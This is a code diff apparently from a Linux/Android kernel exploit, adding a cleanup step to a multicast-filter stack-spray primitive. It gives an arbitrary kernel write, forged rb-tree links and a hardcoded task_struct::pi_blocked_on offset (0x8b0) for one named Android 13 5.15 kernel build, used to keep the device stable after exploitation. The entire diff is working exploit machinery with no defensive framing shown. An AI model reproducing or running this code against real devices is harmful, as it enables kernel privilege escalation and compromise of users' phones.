@@ -100,6 +100,33 @@ static int multicast_cleanup_enabled(void) {
     return cached;
 }
 
+/* Terminator write (B): task_struct::pi_blocked_on on this kernel - the profile
+ * carries the same value as task_pi_blocked_on (0x8b0 for
+ * 5.15.180-android13-8-o-01176-g6333b0dbc8ed). Zeroing the fixture task's field
+ * makes every later PI traversal stop there instead of chasing the dead
+ * waiter's stack, which is what wedges the machine once this process exits.
+ * Disable with GHOSTLOCK_MCAST_SCRUB=0. */
+#define MCAST_TASK_PI_BLOCKED_ON_OFF 0x8b0u
+
+static int multicast_scrub_enabled(void) {
+    static int cached = -1;
+    if (cached < 0) {
+        const char *v = getenv("GHOSTLOCK_MCAST_SCRUB");
+        cached = (v && v[0] == '0' && v[1] == '\0') ? 0 : 1;
+    }
+    return cached;
+}
+
+/* Ask the worker to stamp the buffer again (it owns the kernel frame). */
+static void multicast_request_respray(MulticastWaiterRouteContext *context,
+        uintptr_t target, uintptr_t value) {
+    context->target = target;
+    context->value = value;
+    atomic_store(&context->sprayed, 0);
+    atomic_store(&context->respray_requested, 1);
+    while (!atomic_load(&context->sprayed)) sched_yield();
+}
+
 /* Stack spray primitive.
  *
  * getsockopt(IPPROTO_IP, MCAST_MSFILTER) copies
@@ -383,6 +410,19 @@ int MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
         while (!atomic_load(&context->sprayed)) sched_yield();
         usleep(multicast_post_spray_settle_us());
         pr_success("mcast cleanup stamp landed; forged rb links dropped\n");
+    }
+    if (r == 0 && multicast_scrub_enabled()) {
+        /* B: terminator. Each write is itself a chain walk, so the scrub write
+         * has to come last: zero the fixture task's pi_blocked_on, then leave
+         * the window in the benign (no erase words) shape again. */
+        const uintptr_t term = context->task + MCAST_TASK_PI_BLOCKED_ON_OFF;
+        multicast_request_respray(context, term, 0);
+        usleep(multicast_post_spray_settle_us());
+        long r2 = multicast_waiter_adjust(context);
+        pr_info("mcast scrub terminator: [%#zx] <- 0 ret=%ld\n", term, r2);
+        multicast_request_respray(context, 0, 0);
+        usleep(multicast_post_spray_settle_us());
+        pr_success("mcast scrub done; pi_blocked_on cleared\n");
     }
     return r == 0;
 }
